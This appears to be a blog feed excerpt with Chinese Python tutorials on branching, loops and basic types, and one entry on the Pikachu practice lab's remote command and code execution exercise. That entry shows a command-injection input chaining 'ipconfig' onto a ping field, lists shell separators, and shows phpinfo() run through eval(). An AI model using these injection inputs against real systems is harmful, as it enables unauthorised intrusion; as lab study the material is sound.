    <content type="html"><![CDATA[<h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><p>1、<code>if…else…</code></p><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">money</span>=1000<br><span class="hljs-attribute">s</span>=int(input('请输入取款金额：'))<br><span class="hljs-keyword">if</span> money &gt;=s:<br>    <span class="hljs-attribute">money</span>=money-s<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'取款成功，余额为：'</span>,money)<br></code></pre></td></tr></tbody></table></figure><p>eg: 从键盘输入一个数判断奇偶。</p><figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">num</span>=<span class="hljs-built_in">int</span>(input(<span class="hljs-string">"请输入一个数字："</span>))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">num</span>%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">num</span>,<span class="hljs-string">'是偶数'</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">num</span>,<span class="hljs-string">'是奇数'</span>)<br></code></pre></td></tr></tbody></table></figure><p>2、多分支：<code>if…elif…else</code></p><p>eg: 录入成绩：90-100为A,80-89为B,70-79为C,60-69为D,50-59为E,输入小于0或大于100为错误输入。</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">score</span>=<span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-title">input</span>(<span class="hljs-string">'请输入你的成绩：'</span>))</span><br><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-number">90</span>&lt;=<span class="hljs-variable">score</span>&lt;=<span class="hljs-number">100</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">"you are A"</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">80</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">90</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'you are B'</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">70</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">80</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">"you are C"</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">60</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">70</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">"you are D"</span>)</span><br><span class="hljs-variable">elif</span> <span class="hljs-number">0</span>&lt;=<span class="hljs-variable">score</span>&lt;<span class="hljs-number">60</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'you are E'</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'Error!!'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>3、嵌套if</p><p>eg: 购物结算时，会员&gt;=200 打八折，&gt;=100打九折，&lt;100不打折；非会员 &gt;=200 打9.5折，&lt;200 不打折</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">answer=<span class="hljs-built_in">input</span>(<span class="hljs-string">"您是否为会员？y or n： "</span>)<br>money=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">"请输入您的金额："</span>))<br><span class="hljs-keyword">if</span> answer==<span class="hljs-string">'y'</span>:<br>    <span class="hljs-keyword">if</span> money&gt;=<span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"打八折，您花费了："</span>,money*<span class="hljs-number">0.8</span>)<br>    <span class="hljs-keyword">elif</span> money&gt;=<span class="hljs-number">100</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"打九折，您花费了："</span>,money*<span class="hljs-number">0.9</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"不打折，您花费了："</span>,money)<br><span class="hljs-keyword">elif</span> answer==<span class="hljs-string">'n'</span>:<br>    <span class="hljs-keyword">if</span> money&gt;=<span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"打九五折，您花费了："</span>,money*<span class="hljs-number">0.95</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"不打折，您花费了："</span>,money)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"您输入有误！"</span>)<br></code></pre></td></tr></tbody></table></figure><p>条件表达式： x if 判断条件 else y</p><p>eg: 比大小</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">a</span>=<span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-title">input</span>(<span class="hljs-string">"input a num:"</span>))</span><br><span class="hljs-variable">b</span>=<span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-title">input</span>(<span class="hljs-string">'input a num:'</span>))</span><br><span class="hljs-function"><span class="hljs-title">print</span>( <span class="hljs-title">str</span>(<span class="hljs-variable">a</span>)+<span class="hljs-string">'大于等于'</span>+<span class="hljs-title">str</span>(<span class="hljs-variable">b</span>)  <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">a</span>&gt;<span class="hljs-variable">b</span> <span class="hljs-variable"><span class="hljs-keyword">else</span></span> <span class="hljs-title">str</span>(<span class="hljs-variable">a</span>)+<span class="hljs-string">'小于等于'</span>+<span class="hljs-title">str</span>(<span class="hljs-variable">b</span>))</span><br></code></pre></td></tr></tbody></table></figure><p>pass: 占位符，什么也不做。</p><h1 id="内置函数-range"><a href="#内置函数-range" class="headerlink" title="内置函数 range()"></a>内置函数 range()</h1><ul><li>range(stop) —— 创建（0,stop）之间的整数序列，步长为1</li><li>range(start,stop) —— （start,stop）之间，步长为1</li><li>range(start,stop,step) —— （start,stop）,步长为step</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">r</span>=range(10)<br><span class="hljs-built_in">print</span>(r)<br><span class="hljs-attribute">r</span>=range(1,10)<br><span class="hljs-built_in">print</span>(list(r)) #[1, 2, 3, 4, 5, 6, 7, 8, 9]<br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">in</span> r) # <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(9 <span class="hljs-keyword">in</span> r) # <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r) #<span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(9 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r) #<span class="hljs-literal">False</span><br></code></pre></td></tr></tbody></table></figure><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><p>1、<code>while 条件表达式： 循环体</code></p><p>eg: 计算0到4的累加和</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span>=<span class="hljs-number">0</span><br><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">a</span>&lt;<span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">sum</span>+=<span class="hljs-keyword">a</span><br>    <span class="hljs-keyword">a</span>+=<span class="hljs-number">1</span><br>print(<span class="hljs-string">'和为：'</span>,<span class="hljs-built_in">sum</span>)<br> <span class="hljs-comment"># 10</span><br></code></pre></td></tr></tbody></table></figure><p>eg:计算1-100之间偶数和</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">a</span>=<span class="hljs-number">1</span><br><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">a</span>&lt;<span class="hljs-number">101</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">a</span>%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">sum</span>+=<span class="hljs-keyword">a</span><br>    <span class="hljs-keyword">a</span>+=<span class="hljs-number">1</span><br>print(<span class="hljs-built_in">sum</span>)<br> <span class="hljs-comment">#  2550</span><br></code></pre></td></tr></tbody></table></figure><p>2、<code>for-in循环</code></p><p>依次取值，又称遍历</p><p><code>for 变量 in 可迭代对象：  循环体</code></p><p>在循环体中不需要变量时，可写作‘_’</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-string">'python'</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span><br><span class="hljs-variable">for</span> <span class="hljs-variable">a</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">10</span>):</span><br><span class="hljs-function">    <span class="hljs-title">print</span>(<span class="hljs-variable">a</span>)</span><br><span class="hljs-variable">for</span> <span class="hljs-variable">_</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">5</span>):</span><br><span class="hljs-function">    <span class="hljs-title">print</span>(<span class="hljs-string">'人生苦短，我用python'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>eg:计算1-100之间偶数和</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">sum</span>=0<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,101):<br>    <span class="hljs-keyword">if</span> i%<span class="hljs-attribute">2</span>==0:<br>        sum+=i<br><span class="hljs-built_in">print</span>(sum)<br></code></pre></td></tr></tbody></table></figure><p>eg: 计算千以内的水仙花数</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(100,1000):<br>    <span class="hljs-attribute">c</span>=n%10<br>    <span class="hljs-attribute">b</span>=n//10%10<br>    <span class="hljs-attribute">a</span>=n//100<br>    <span class="hljs-keyword">if</span> <span class="hljs-attribute">n</span>==a**3+b**3+c**3:<br>        <span class="hljs-built_in">print</span>(n)<br></code></pre></td></tr></tbody></table></figure><p>3、流程控制语句break</p><p>用于结束循环结构</p><p>eg:录入密码，最多输入三次，正确则结束退出。</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">3</span>):</span><br><span class="hljs-function">    <span class="hljs-variable">pwd</span>=<span class="hljs-title">input</span>(<span class="hljs-string">'请输入密码：'</span>)</span><br>    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">pwd</span>==<span class="hljs-string">'8'</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'正确'</span>)</span><br>        <span class="hljs-variable">break</span><br>    <span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'错误'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>4、continue 结束当前循环，进入下一循环。</p><p>eg: 1-50之间5的倍数：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">51</span>):<br>    <span class="hljs-attribute">if</span> i%<span class="hljs-number">5</span>!=<span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">continue</span><br>    <span class="hljs-attribute">print</span>(i)<br></code></pre></td></tr></tbody></table></figure><p>5、else 语句</p><p>eg:</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">3</span>):</span><br><span class="hljs-function">    <span class="hljs-variable">pwd</span>=<span class="hljs-title">input</span>(<span class="hljs-string">"请输入密码："</span>)</span><br>    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">pwd</span>==<span class="hljs-string">'8'</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'True'</span>)</span><br>        <span class="hljs-variable">break</span><br>    <span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'False'</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">else</span></span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">'Sorry,the three times all False'</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>6、嵌套循环</p><p>eg: 三行四列的矩形</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(3):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,5):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'*'</span>,<span class="hljs-attribute">end</span>=<span class="hljs-string">'\t'</span>)<br>    <span class="hljs-built_in">print</span>()   <br></code></pre></td></tr></tbody></table></figure><p>eg: 左侧三角型</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,10):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,i+1):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'*'</span>,<span class="hljs-attribute">end</span>=<span class="hljs-string">''</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></tbody></table></figure><p>eg: 打印乘法表</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,10):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(1,i+1):<br>        <span class="hljs-built_in">print</span>(i,<span class="hljs-string">'*'</span>,j,<span class="hljs-string">'='</span>,i*j,<span class="hljs-attribute">end</span>=<span class="hljs-string">'    '</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></tbody></table></figure><p>7、二重循环中break和continue</p><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>):<br>    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>        <span class="hljs-attribute">if</span> j%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">break</span><br>        <span class="hljs-attribute">print</span>(j)<br></code></pre></td></tr></tbody></table></figure><p>j=1时，break退回外层循环，此后只执行外层循环；改成continue后，内循环将跳回 <code>for j in range(1,11)</code> 上</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分支结构&quot;&gt;&lt;a href=&quot;#分支结构&quot; class=&quot;headerlink&quot; title=&quot;分支结构&quot;&gt;&lt;/a&gt;分支结构&lt;/h1&gt;&lt;p&gt;1、&lt;code&gt;if…else…&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;eg:&lt;/p&gt;
&lt;figure class=&quot;highligh</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pikachu-RCE</title>
    <link href="https://sinky.top/2022/08/11/pikachu-RCE/"/>
    <id>https://sinky.top/2022/08/11/pikachu-RCE/</id>
    <published>2022-08-11T14:17:28.967Z</published>
    <updated>2022-08-11T14:33:04.867Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE (remote command/code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。</p><h2 id="远程系统命令执行"><a href="#远程系统命令执行" class="headerlink" title="远程系统命令执行"></a>远程系统命令执行</h2><p>一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。一般会给用户一个ping操作的web界面，用户从web界面输入目标ip,提交后会对该IP地址进行一次ping测试，并返回测试结果。没有安全控制的话会导致攻击者通过该接口提交恶意命令，后台执行会控制整个后台服务器。</p><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p>后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略</p><pre><code class="hljs">exec "ping"</code></pre><p><img src="https://s2.loli.net/2022/08/11/bzJDf953yhviwBW.png" alt="图片.png"></p><p>ping一下本地返回正常。</p><p>输入命令： <code>www.baidu.com &amp; ipconfig</code> 发现可以获取到用户的ip地址。</p><p>“&amp;”的作用是先执行 <code>www.baidu.com</code></p><p>或者： &amp;、&amp;&amp;、|、||、； 等拼接执行命令。</p><pre><code class="hljs">exec "eval"</code></pre><p><img src="https://s2.loli.net/2022/08/11/3mcQnH1T2xrGCIb.png" alt="图片.png"></p><p>不知道为啥输入什么都报错</p><p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" alt="图片.png"></p><p>看了一下网页代码，啥也没有，查看了后台源代码：</p><p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" alt="图片.png"><br><img src="https://s2.loli.net/2022/08/11/OKkmEnHDoWRN94B.png" alt="图片.png"></p><p>用户输入值直接被带入到<code>eval()</code>函数中进行执行，没有任何安全处理。</p><p>输入 <code>phpinfo(); </code>返回显示了php系统信息。</p><p>eval函数的作用是将字符串当作php代码执行，它允许执行任意 PHP 代码</p><p>它允许执行任意 PHP 代码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;RCE (remote command/code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
    <category term="RCE" scheme="https://sinky.top/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Python学习1</title>
    <link href="https://sinky.top/2022/08/10/python%E5%AD%A6%E4%B9%A01/"/>
    <id>https://sinky.top/2022/08/10/python%E5%AD%A6%E4%B9%A01/</id>
    <published>2022-08-10T11:57:31.721Z</published>
    <updated>2022-08-14T02:49:07.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="输出函数print"><a href="#输出函数print" class="headerlink" title="输出函数print()"></a>输出函数print()</h2><p>1.可输出数字、字符串、表达式</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-number">520</span>)</span></span> <span class="hljs-number">#520</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'HelloWorld'</span>)</span></span> <span class="hljs-selector-id">#HelloWorld</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)</span></span> #<span class="hljs-number">4</span><br></code></pre></td></tr></tbody></table></figure><p>2.将数据输出文件中 <code>file=fp</code></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">fp=<span class="hljs-built_in">open</span>(<span class="hljs-string">'D:/text.txt'</span>,<span class="hljs-string">'a+'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'Hello'</span>,file=fp)</span></span><br>fp<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></tbody></table></figure><blockquote><p><code>a+</code> 若文件不存在则创建，存在则在文件内容后追加，读写。</p></blockquote><p>3.不进行换行输出</p><p><code>print('Hello','world','python') #Hello world python</code></p><h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><ol><li></li></ol><p><code>\n</code> - 换行；<code>\r</code> - 回车；<code>\t</code> - 水平制表符；<code>\b</code> - 退格；</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'hello\rworld'</span>)</span></span> <span class="hljs-selector-id">#world</span> #world将hello覆盖<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'hello\bworld'</span>)</span></span> <span class="hljs-selector-id">#hellworld</span> #\b退格，将o退没了<br></code></pre></td></tr></tbody></table></figure><p>2.原字符，在字符串前加r或R，可使字符串内转义字符失效。</p><pre><code class="hljs">print(r'hello\nworld') #hello\nworld</code></pre><p>注意：字符串最后一个字符不可为斜杠。</p><h2 id="进制，字符编码，标识符，保留字"><a href="#进制，字符编码，标识符，保留字" class="headerlink" title="进制，字符编码，标识符，保留字"></a>进制，字符编码，标识符，保留字</h2><p>1Byte(字节)=8bit(位)</p><p>1KB(千字节)=1024Byte</p><p>1MB(兆字节)=1024KB</p><p>1GB(吉字节)=1024MB</p><p>1TB(太字节)=1024GB</p><p>标识符：字母、数字、下划线（不可以数字开头，严格区分大小写）</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>内存中一个带标签的空间</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">name=<span class="hljs-string">'Lihua'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'标识'</span>,id(name)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'类型'</span>,type(name)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'值'</span>,name)</span></span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">标识 <span class="hljs-number">1694477549296</span><br>类型 &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">str</span>'&gt;<br>值 <span class="hljs-symbol">Lihua</span><br></code></pre></td></tr></tbody></table></figure><p>多次赋值后，变量名会指向新的使用。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="int-整型"><a href="#int-整型" class="headerlink" title="int 整型"></a>int 整型</h3><ul><li>十进制 默认的进制0-9</li><li>二进制 以0b开头0,1</li><li>八进制 以0o开头0-7</li><li>十六禁止 以0x开头0-9，A-F</li></ul><h3 id="float-浮点型"><a href="#float-浮点型" class="headerlink" title="float 浮点型"></a>float 浮点型</h3><p>存储具有不精确性，可导入模块Decimal</p><figure class="highlight lasso"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">from <span class="hljs-built_in">decimal</span> <span class="hljs-keyword">import</span> <span class="hljs-built_in">Decimal</span><br>print(<span class="hljs-built_in">Decimal</span>(<span class="hljs-string">'1.1'</span>)+<span class="hljs-built_in">Decimal</span>(<span class="hljs-string">'2.2'</span>)) #3<span class="hljs-number">.3</span><br></code></pre></td></tr></tbody></table></figure><h3 id="str-字符串类型；bool-布尔类型"><a href="#str-字符串类型；bool-布尔类型" class="headerlink" title="str 字符串类型；bool 布尔类型"></a>str 字符串类型；bool 布尔类型</h3><p>字符串可用单引号、双引号、三引号或””” “””定义。</p><p>单引号双引号定义的字符串需要在一行；三引号可多行；</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">'''人生苦短，</span><br><span class="hljs-string">我用python'''</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">人生苦短，<br>我用<span class="hljs-keyword">python</span><br></code></pre></td></tr></tbody></table></figure><h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><ul><li>str() 其他转字符串，也可以引号转</li><li>int() 其他转整形，文字和小数不能转，浮点数抹零取整</li><li>float() 其他转浮点，文字类不可转，整数转浮点末尾加.0</li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=<span class="hljs-string">'张三'</span><br><span class="hljs-attribute">age</span>=20<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'我叫'</span>+name+<span class="hljs-string">'，今年'</span>+str(age)+<span class="hljs-string">'岁'</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=<span class="hljs-number">10</span><br>b=<span 